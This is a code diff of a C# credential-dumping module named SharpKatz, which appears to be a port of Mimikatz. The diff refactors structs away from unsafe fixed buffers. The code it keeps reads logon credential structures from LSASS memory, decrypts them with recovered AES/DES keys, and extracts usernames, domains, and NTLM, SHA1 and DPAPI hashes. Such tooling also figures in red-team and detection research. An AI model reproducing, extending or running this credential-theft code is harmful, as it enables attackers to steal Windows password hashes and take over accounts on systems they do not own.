@@ -37,7 +37,7 @@ namespace SharpKatz.Module
         }
 
         [StructLayout(LayoutKind.Sequential)]
-        public unsafe struct KIWI_MSV1_0_LIST_63
+        public struct KIWI_MSV1_0_LIST_63
         {
             public IntPtr Flink;   //KIWI_MSV1_0_LIST_63 off_2C5718
             public IntPtr Blink; //KIWI_MSV1_0_LIST_63 off_277380
@@ -57,7 +57,8 @@ namespace SharpKatz.Module
             public IntPtr unk13; // unk_2C0A28
             public Natives.LUID LocallyUniqueIdentifier;
             public Natives.LUID SecondaryLocallyUniqueIdentifier;
-            public fixed byte waza[12]; /// to do (maybe align)
+            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 12)]
+            public byte[] waza; /// to do (maybe align)
             public Natives.UNICODE_STRING UserName;
             public Natives.UNICODE_STRING Domaine;
             public IntPtr unk14;
@@ -85,7 +86,7 @@ namespace SharpKatz.Module
         }
 
         [StructLayout(LayoutKind.Sequential)]
-        public unsafe struct KIWI_MSV1_0_LIST_62
+        public struct KIWI_MSV1_0_LIST_62
         {
             public IntPtr Flink;
             public IntPtr Blink;
@@ -143,13 +144,16 @@ namespace SharpKatz.Module
         const int SHA_DIGEST_LENGTH = 20;
 
         [StructLayout(LayoutKind.Sequential)]
-        public unsafe struct MSV1_0_PRIMARY_CREDENTIAL
+        public struct MSV1_0_PRIMARY_CREDENTIAL
         {
             Natives.UNICODE_STRING LogonDomainName;
             Natives.UNICODE_STRING UserName;
-            fixed byte NtOwfPassword[LM_NTLM_HASH_LENGTH];
-            fixed byte LmOwfPassword[LM_NTLM_HASH_LENGTH];
-            fixed byte ShaOwPassword[SHA_DIGEST_LENGTH];
+            [MarshalAs(UnmanagedType.ByValArray, SizeConst = LM_NTLM_HASH_LENGTH)]
+            byte[] NtOwfPassword;
+            [MarshalAs(UnmanagedType.ByValArray, SizeConst = LM_NTLM_HASH_LENGTH)]
+            byte[] LmOwfPassword;
+            [MarshalAs(UnmanagedType.ByValArray, SizeConst = SHA_DIGEST_LENGTH)]
+            byte[] ShaOwPassword;
             byte isNtOwfPassword;
             byte isLmOwfPassword;
             byte isShaOwPassword;
@@ -157,7 +161,7 @@ namespace SharpKatz.Module
         }
 
         [StructLayout(LayoutKind.Sequential)]
-        public unsafe struct MSV1_0_PRIMARY_CREDENTIAL_10_OLD
+        public struct MSV1_0_PRIMARY_CREDENTIAL_10_OLD
         {
             Natives.UNICODE_STRING LogonDomainName;
             Natives.UNICODE_STRING UserName;
@@ -167,14 +171,17 @@ namespace SharpKatz.Module
             byte isShaOwPassword;
             byte align0;
             byte align1;
-            fixed byte NtOwfPassword[LM_NTLM_HASH_LENGTH];
-            fixed byte LmOwfPassword[LM_NTLM_HASH_LENGTH];
-            fixed byte ShaOwPassword[SHA_DIGEST_LENGTH];
+            [MarshalAs(UnmanagedType.ByValArray, SizeConst = LM_NTLM_HASH_LENGTH)]
+            byte[] NtOwfPassword;
+            [MarshalAs(UnmanagedType.ByValArray, SizeConst = LM_NTLM_HASH_LENGTH)]
+            byte[] LmOwfPassword;
+            [MarshalAs(UnmanagedType.ByValArray, SizeConst = SHA_DIGEST_LENGTH)]
+            byte[] ShaOwPassword;
             /* buffer */
         }
 
         [StructLayout(LayoutKind.Sequential)]
-        public unsafe struct MSV1_0_PRIMARY_CREDENTIAL_10
+        public struct MSV1_0_PRIMARY_CREDENTIAL_10
         {
             Natives.UNICODE_STRING LogonDomainName;
             Natives.UNICODE_STRING UserName;
@@ -186,14 +193,17 @@ namespace SharpKatz.Module
             byte align1;
             byte align2;
             byte align3;
-            fixed byte NtOwfPassword[LM_NTLM_HASH_LENGTH];
-            fixed byte LmOwfPassword[LM_NTLM_HASH_LENGTH];
-            fixed byte ShaOwPassword[SHA_DIGEST_LENGTH];
+            [MarshalAs(UnmanagedType.ByValArray, SizeConst = LM_NTLM_HASH_LENGTH)]
+            byte[] NtOwfPassword;
+            [MarshalAs(UnmanagedType.ByValArray, SizeConst = LM_NTLM_HASH_LENGTH)]
+            byte[] LmOwfPassword;
+            [MarshalAs(UnmanagedType.ByValArray, SizeConst = SHA_DIGEST_LENGTH)]
+            byte[] ShaOwPassword;
             /* buffer */
         }
 
         [StructLayout(LayoutKind.Sequential)]
-        public unsafe struct MSV1_0_PRIMARY_CREDENTIAL_10_1607
+        public struct MSV1_0_PRIMARY_CREDENTIAL_10_1607
         {
             Natives.UNICODE_STRING LogonDomainName;
             Natives.UNICODE_STRING UserName;
@@ -209,16 +219,20 @@ namespace SharpKatz.Module
             uint unkD; // 1/2 DWORD
                        //#pragma pack(push, 2)
             ushort isoSize;  // 0000 WORD
-            fixed byte DPAPIProtected[LM_NTLM_HASH_LENGTH];
+            [MarshalAs(UnmanagedType.ByValArray, SizeConst = LM_NTLM_HASH_LENGTH)]
+            byte[] DPAPIProtected;
             uint align3; // 00000000 DWORD
                          //#pragma pack(pop) 
-            fixed byte NtOwfPassword[LM_NTLM_HASH_LENGTH];
-            fixed byte LmOwfPassword[LM_NTLM_HASH_LENGTH];
-            fixed byte ShaOwPassword[SHA_DIGEST_LENGTH];
+            [MarshalAs(UnmanagedType.ByValArray, SizeConst = LM_NTLM_HASH_LENGTH)]
+            byte[] NtOwfPassword;
+            [MarshalAs(UnmanagedType.ByValArray, SizeConst = LM_NTLM_HASH_LENGTH)]
+            byte[] LmOwfPassword;
+            [MarshalAs(UnmanagedType.ByValArray, SizeConst = SHA_DIGEST_LENGTH)]
+            byte[] ShaOwPassword;
             /* buffer */
         }
 
-        public static unsafe int FindCredentials(IntPtr hLsass, OSVersionHelper oshelper, byte[] iv, byte[] aeskey, byte[] deskey, List<Logon> logonlist)
+        public static int FindCredentials(IntPtr hLsass, OSVersionHelper oshelper, byte[] iv, byte[] aeskey, byte[] deskey, List<Logon> logonlist)
         {
 
             foreach(Logon logon in logonlist)
@@ -229,18 +243,12 @@ namespace SharpKatz.Module
                 {
 
                     Msv msventry = new Msv();
-
-                    /*Console.WriteLine("[*] Authentication Id : {0} ; {1} ({2:X}:{3:X})", luid.HighPart, luid.LowPart, luid.HighPart, luid.LowPart);
-                    Console.WriteLine("[*] Session {0} from {1}", KUHL_M_SEKURLSA_LOGON_TYPE[logonsession.LogonType], logonsession.Session);
-                    Console.WriteLine("[*] UserName {0}", logonsession.UserName);
-                    Console.WriteLine("[*] LogonDomain {0}", logonsession.LogonDomain);
-                    Console.WriteLine("[*] LogonServer {0}", logonsession.LogonServer);*/
                     
                     KIWI_MSV1_0_PRIMARY_CREDENTIALS primaryCredentials;
 
                     while (lsasscred != IntPtr.Zero)
                     {
-                        byte[] credentialsBytes = Utility.ReadFromLsass(ref hLsass, lsasscred, Convert.ToUInt64(sizeof(KIWI_MSV1_0_CREDENTIALS)));
+                        byte[] credentialsBytes = Utility.ReadFromLsass(ref hLsass, lsasscred, Convert.ToUInt64(Marshal.SizeOf(typeof(KIWI_MSV1_0_CREDENTIALS))));
                         
                         IntPtr pPrimaryCredentials = new IntPtr(BitConverter.ToInt64(credentialsBytes, Utility.FieldOffset<KIWI_MSV1_0_CREDENTIALS>("PrimaryCredentials")));
                         IntPtr pNext = new IntPtr(BitConverter.ToInt64(credentialsBytes, Utility.FieldOffset<KIWI_MSV1_0_CREDENTIALS>("next")));
@@ -248,7 +256,7 @@ namespace SharpKatz.Module
                         lsasscred = pPrimaryCredentials;
                         while (lsasscred != IntPtr.Zero)
                         {
-                            byte[] primaryCredentialsBytes = Utility.ReadFromLsass(ref hLsass, lsasscred, Convert.ToUInt64(sizeof(KIWI_MSV1_0_PRIMARY_CREDENTIALS)));
+                            byte[] primaryCredentialsBytes = Utility.ReadFromLsass(ref hLsass, lsasscred, Convert.ToUInt64(Marshal.SizeOf(typeof(KIWI_MSV1_0_PRIMARY_CREDENTIALS))));
                             primaryCredentials = Utility.ReadStruct<KIWI_MSV1_0_PRIMARY_CREDENTIALS>(primaryCredentialsBytes);
                             primaryCredentials.Credentials = Utility.ExtractUnicodeString(hLsass, IntPtr.Add(lsasscred, oshelper.MSV1CredentialsOffset));
                             primaryCredentials.Primary = Utility.ExtractUnicodeString(hLsass, IntPtr.Add(lsasscred, oshelper.MSV1PrimaryOffset));
@@ -260,8 +268,8 @@ namespace SharpKatz.Module
 
                                 byte[] msvDecryptedCredentialsBytes = BCrypt.DecryptCredentials(msvCredentialsBytes, iv, aeskey, deskey);
 
-                                UNICODE_STRING usLogonDomainName = Utility.ReadStruct<UNICODE_STRING>(Utility.GetBytes(msvDecryptedCredentialsBytes, oshelper.LogonDomainNameOffset, sizeof(UNICODE_STRING)));
-                                UNICODE_STRING usUserName = Utility.ReadStruct<UNICODE_STRING>(Utility.GetBytes(msvDecryptedCredentialsBytes, oshelper.UserNameOffset, sizeof(UNICODE_STRING)));
+                                UNICODE_STRING usLogonDomainName = Utility.ReadStruct<UNICODE_STRING>(Utility.GetBytes(msvDecryptedCredentialsBytes, oshelper.LogonDomainNameOffset, Marshal.SizeOf(typeof(UNICODE_STRING))));
+                                UNICODE_STRING usUserName = Utility.ReadStruct<UNICODE_STRING>(Utility.GetBytes(msvDecryptedCredentialsBytes, oshelper.UserNameOffset, Marshal.SizeOf(typeof(UNICODE_STRING))));
 
                                 msventry = new Msv();
                                 msventry.DomainName = Encoding.Unicode.GetString(Utility.GetBytes(msvDecryptedCredentialsBytes, usLogonDomainName.Buffer.ToInt32(), usLogonDomainName.MaximumLength)); 
@@ -270,17 +278,6 @@ namespace SharpKatz.Module
                                 msventry.Ntlm = Utility.PrintHashBytes(Utility.GetBytes(msvDecryptedCredentialsBytes, oshelper.NtOwfPasswordOffset, LM_NTLM_HASH_LENGTH));
                                 msventry.Sha1 = Utility.PrintHashBytes(Utility.GetBytes(msvDecryptedCredentialsBytes, oshelper.ShaOwPasswordOffset, SHA_DIGEST_LENGTH));
                                 msventry.Dpapi = Utility.PrintHashBytes(Utility.GetBytes(msvDecryptedCredentialsBytes, oshelper.DPAPIProtectedOffset, LM_NTLM_HASH_LENGTH));
-                                /*Console.WriteLine("[*]\t Username : {0} ", Marshal.PtrToStringUni(IntPtr.Add(msvCredentials, usUserName.Buffer.ToInt32())));
-                                Console.WriteLine("[*]\t Domain   : {0} ", Marshal.PtrToStringUni(IntPtr.Add(msvCredentials, usLogonDomainName.Buffer.ToInt32())));
-                                Console.Write("[*]\t LM       : ");
-                                Utility.PrintHash(IntPtr.Add(msvCredentials, oshelper.LmOwfPasswordOffset), LM_NTLM_HASH_LENGTH);
-                                Console.Write("[*]\t NTLM     : ");
-                                Utility.PrintHash(IntPtr.Add(msvCredentials, oshelper.NtOwfPasswordOffset), LM_NTLM_HASH_LENGTH);
-                                Console.Write("[*]\t SHA1     : ");
-                                Utility.PrintHash(IntPtr.Add(msvCredentials, oshelper.ShaOwPasswordOffset), SHA_DIGEST_LENGTH);
-                                Console.Write("[*]\t DPAPI    : ");
-                                Utility.PrintHash(IntPtr.Add(msvCredentials, oshelper.DPAPIProtectedOffset), LM_NTLM_HASH_LENGTH);
-                                Console.WriteLine("\n");*/
 
                                 Logon currentlogon = logonlist.FirstOrDefault(x => x.LogonId.HighPart == luid.HighPart && x.LogonId.LowPart == luid.LowPart);
                                 if (currentlogon == null)
